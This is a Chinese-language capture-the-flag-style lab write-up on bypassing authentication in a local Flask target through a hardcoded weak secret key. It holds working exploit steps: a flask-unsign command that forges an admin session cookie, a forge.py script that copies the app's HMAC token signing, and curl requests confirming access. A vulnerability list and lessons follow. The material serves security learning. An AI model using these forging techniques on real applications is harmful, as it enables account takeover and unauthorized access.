# day2 lab Writeup：Flask 认证绕过（两条路径）

> 环境：本地 Flask 靶场 http://192.168.36.129:5000
> 目标：不输入密码，进入受保护的 `/home`
> 结果：成功，两条互相独立的攻击路径

---

## 一、环境观察

登录 `/login` 后，响应头里有三个 Set-Cookie：

```
session_id=87dd648c0e91465bb75362217b7e46c5    ← 32 位随机串
tracking_id=b7890d45e4cb4cb2a6c1118c35940d51   ← 干扰项
session=eyJuYW1lIjoiYWxpY2UiLCJ1aWQiOjF9.xxx.yyy ← Flask 签名 cookie
```

响应体 JSON 直接给出了两条路的用法：

```json
{
  "ok": true,
  "session_id_请用 Cookie 头": "...",
  "token_请用 Authorization 头": "eyJ....xxx"
}
```

受保护路由（`grep -n '@app.route' app.py`）：

```
/login  /home  /me  /logout  /admin/sessions
```

---

## 二、根因：硬编码弱密钥

```python
app.secret_key = "123456"      # 第 30 行左右
```

这一行是整条攻击链的根。它同时被两个地方使用：

1. Flask 自带的 session 签名
2. 自定义 token 的 HMAC 签名

---

## 三、路径 A：伪造 Flask session cookie

### 1. 分析

```python
if "uid" in session:                       # 路线 A
    g.user = {"id": session["uid"], "name": session["name"], ...}
```

只判断 `uid` 键**是否存在**，不校验值，也不查数据库。

而 `session["name"]` 会被直接当作身份使用 —— 服务器完全信任客户端传来的名字。

### 2. 利用

```bash
flask-unsign --sign \
  --cookie "{'name': 'admin', 'uid': 0}" \
  --secret '"123456"'
```

注意 secret 要双层引号：`'"123456"'`。只写 `'123456'` 会被当成整数，报
`Secret must be a string-type`。

### 3. 验证

```bash
curl -i --cookie "session=<签出来的值>" http://192.168.36.129:5000/home
```

结果：

```
HTTP/1.1 200 OK
<h1>欢迎 admin</h1>
<p>登录方式：cookie-session</p>
```

---

## 四、路径 B：复刻 HMAC，伪造自定义 token

### 1. 分析源码

```python
def make_token(uid, ttl=300):
    payload = {"uid": uid, "exp": int(time.time()) + ttl, "nonce": uuid.uuid4().hex}
    body = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    sig = hmac.new(app.secret_key.encode(), body.encode(), hashlib.sha256).hexdigest()
    return f"{body}.{sig}"
```

签名格式是 `body.sig`，**不是** JWT 的三段式，也不是 Flask 的 itsdangerous 格式。

所以 `flask-unsign` 在这条路上完全无效 —— 这是本次最大的坑。

### 2. 复刻脚本 forge.py

```python
import base64, json, hmac, hashlib, time, uuid

SECRET = b"123456"

def make_token(uid, ttl=3600):
    payload = {"uid": uid, "exp": int(time.time()) + ttl, "nonce": uuid.uuid4().hex}
    body = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    sig = hmac.new(SECRET, body.encode(), hashlib.sha256).hexdigest()
    return f"{body}.{sig}"

print(make_token(1))
```

### 3. 验证

```bash
T=$(python3 forge.py)
curl -i -H "Authorization: Bearer $T" http://192.168.36.129:5000/home
```

结果：

```
HTTP/1.1 200 OK
<h1>欢迎 token-user</h1>
<p>登录方式：bearer-token</p>
```

注意名字是硬编码的 `token-user`，说明这条路没还原真实身份。

---

## 五、发现的漏洞（按严重程度）

### 1. 硬编码弱密钥（严重）

`app.secret_key = "123456"` —— 所有签名防护形同虚设。弱密钥等于没有密钥。

### 2. 信任客户端传来的身份（严重）

`session["name"]` 被直接当身份用。cookie 里写 `admin`，就是 admin。

### 3. /admin/sessions 越权（严重）

任何持有合法 token 的人都能访问，直接返回服务端 session 仓库：

```json
{
  "d77be26a2eb641cc921c938fce94009a": {
    "ip": "192.168.36.1",
    "login_at": 1794738614,
    "name": "alice",
    "ua": "Mozilla/5.0 ...",
    "uid": 1
  }
}
```

泄露了真实用户的 session id、IP、UA、登录时间。

### 4. 无防重放（中）

同一个有效 token 连续请求两次，两次都是 200。有效期内可无限次使用。

### 5. nonce 生成但不校验（中）

`make_token` 塞了 `nonce` 字段，但 `verify_token` 从未检查它 —— 属于“无效校验”，假防护。

### 6. session_id cookie 无人校验（低）

登录时下发了 `session_id`，但 `login_required` 只检查 Flask 的 `session` cookie，从不读取 `session_id`。这个 cookie 是装饰品。

### 7. 错误信息泄露（低）

`return jsonify({"error": err}), 401` 把具体原因返回给客户端，攻击者能区分“签名不匹配”和“token 已过期”。

### 8. 空 token 导致解包异常（低）

```python
body, sig = token.rsplit(".", 1)
```

传入空字符串时返回一个元素，解包失败抛
`not enough values to unpack (expected 2, got 1)`。缺乏入参校验。

---

## 六、阴性测试（防护有效的部分）

用 `ttl=5` 签一个 token，等 5 秒后请求：

```
HTTP/1.1 401 UNAUTHORIZED
{"error": "token 已过期"}
```

**结论：TTL 过期检查是有效的。**

报告里阴性结果同样重要 —— 它证明测试是双向的，不是只挑好听的写。

---

## 七、知识点

1. **认证 ≠ 授权。** 验证了“你有没有凭证”，不等于验证了“你能不能干这件事”。
2. **签名 ≠ 加密。** 数据本身是明文（Base64），谁都能解；防的是篡改，不是窃读。
3. **弱密钥 = 没有密钥。** 一个能进字典的 secret，整套签名体系就废了。
4. **自定义签名格式，工具无效。** 必须读源码、复刻算法，不能盲信 flask-unsign / jwt_tool。
5. **凭证要看出处，不看形状。** 长得像钥匙，不代表门认它（session_id 就是例子）。
6. **信任客户端数据是万恶之源。** 名字、角色、权限，只要是从 cookie 里读的，都能伪造。

---

## 八、时间线

| 步骤 | 动作 |
|---|---|
| 1 | 登录抓包，发现三个 Set-Cookie |
| 2 | 读 app.py，找到 secret_key = "123456" |
| 3 | 读 make_token / verify_token，确认自定义签名格式 |
| 4 | flask-unsign 签 Flask cookie 失败（--no-literal-eval 坑） |
| 5 | 改用 forge.py 复刻 HMAC，签 token 成功（路径 B） |
| 6 | 修正引号后 flask-unsign 成功（路径 A） |
| 7 | 测试过期 token，确认 TTL 有效 |
| 8 | 测试重放，确认无防重放 |
| 9 | 访问 /admin/sessions，确认越权泄露 |

---

## 九、踩过的坑

1. `curl` 里 URL 带空格和单引号会报 `URL rejected: Malformed input`，要用 `--data-urlencode` 或转义。
2. shell 里引号没闭合会进入 `dquote>` 等待状态，按 `Ctrl+C` 退出。
3. `flask-unsign --secret '123456'` 会把数字当整数，要写成 `'"123456"'`。
4. `--no-literal-eval` 会把 cookie 字符串当字面量，payload 变成字符串而不是字典。
5. 长 token 手打必错，先存进变量：`T=$(python3 forge.py)`。
